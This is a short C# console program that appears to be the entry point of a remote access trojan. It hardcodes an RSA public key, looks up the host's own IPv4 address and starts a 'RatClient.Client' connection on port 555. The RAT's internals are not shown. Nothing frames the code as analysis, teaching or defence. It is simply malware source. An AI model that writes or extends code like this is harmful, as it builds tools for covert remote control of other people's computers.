using System;
using System.Linq;
using System.Numerics;
using System.Text;



namespace ConsoleApp43
{
    class Program
    {
        static void Main(string[] args)
        {
            BigInteger n = BigInteger.Parse("130207301034004661455027913688923327146343398866625243908655292016961311687455936189602612639881746041437642117397999433889984747790829683399942449818446067929003127144782759564471484412125307160062468145732861525984991405836950669766085891756502788398772584383449300023796025235227753602387780436256335801097");
            BigInteger e = BigInteger.Parse("65537");
            BigInteger[] publicKey = new BigInteger[] { e, n };
            string ipAddress = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName())
                .AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
            Console.WriteLine(ipAddress);
            var client = new RatClient.Client(ipAddress, 555, publicKey);
            client.Handle();
        }
    }
}
